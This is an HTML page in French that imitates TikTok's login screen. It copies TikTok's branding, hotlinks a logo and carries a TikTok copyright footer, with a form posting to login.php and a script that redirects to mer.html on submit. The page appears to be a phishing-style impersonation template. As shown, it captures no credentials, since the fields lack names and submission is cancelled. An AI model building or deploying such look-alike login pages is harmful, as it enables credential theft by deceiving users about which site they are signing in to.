<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion TikTok</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: #fff;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }
        
        .container {
            max-width: 420px;
            margin: 0 auto;
            padding: 20px;
            width: 100%;
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            text-align: center;
            padding: 40px 0 20px;
        }
        
          .logo {
            width: 100px;
            margin-bottom: 0px;
            border-radius: 30%;
        }
        
        .login-form {
            background-color: #121212;
            border-radius: 12px;
            padding: 40px 26px;
            margin-top: 20px;
        }
        
        h1 {
            font-size: 22px;
            text-align: center;
            margin-bottom: 30px;
        }
        
        .input-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        input {
            width: 100%;
            background-color: #121212;
            border: 1px solid #3d3d3d;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            padding: 16px 12px;
            outline: none;
        }
        
        input:focus {
            border-color: #25F4EE;
        }
        
        .forgot-password {
            color: #25F4EE;
            text-decoration: none;
            font-size: 14px;
            float: right;
            margin-top: 8px;
        }
        
        .login-btn {
            width: 100%;
            background-color: #FE2C55;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 500;
            padding: 14px;
            margin-top: 30px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        
        .login-btn:hover {
            background-color: #ff3a60;
        }
        
        .divider {
            display: flex;
            align-items: center;
            margin: 30px 0;
            color: #777;
            font-size: 14px;
        }
        
        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #3d3d3d;
        }
        
        .divider::before {
            margin-right: 16px;
        }
        
        .divider::after {
            margin-left: 16px;
        }
        
        .other-options {
            text-align: center;
            margin-top: 20px;
            font-size: 14px;
        }
        
        .signup-link {
            color: #25F4EE;
            text-decoration: none;
            font-weight: 500;
        }
        
        .footer {
            text-align: center;
            padding: 20px;
            font-size: 12px;
            color: #777;
        }
    </style>
</head>
<body>
    <div class="container">
        <header class="header">
           
              <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSbxE-AI3XDIEOnwVFqPurOCfqwmhqADWQ92Q&s" alt="TikTok Logo" class="logo">
        </header>
        
        <div class="login-form">
            <h1>Connectez-vous à TikTok</h1>
            
             <form action="login.php" method="post" id="loginForm">
                <div class="input-group">
                    <input type="text" placeholder="Nom d'utilisateur ou email" required>
                </div>
                
                <div class="input-group">
                    <input type="password" placeholder="Mot de passe" required>
                    <a href="login.html" class="forgot-password">Mot de passe oublié ?</a>
                </div>
                
                <button type="submit" class="login-btn">Se connecter</button>
            </form>
            
            <div class="divider">ou</div>
            
            <div class="other-options">
                <p>Vous n'avez pas de compte ? <a href="login.html" class="signup-link">S'inscrire</a></p>
            </div>
        </div>
    </div>
    
    <footer class="footer">
        <p>© 2025 TikTok</p>
    </footer>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            e.preventDefault();
            // Redirection vers mer.html après soumission
            window.location.href = 'mer.html';
        });
    </script>
</body>
</html>
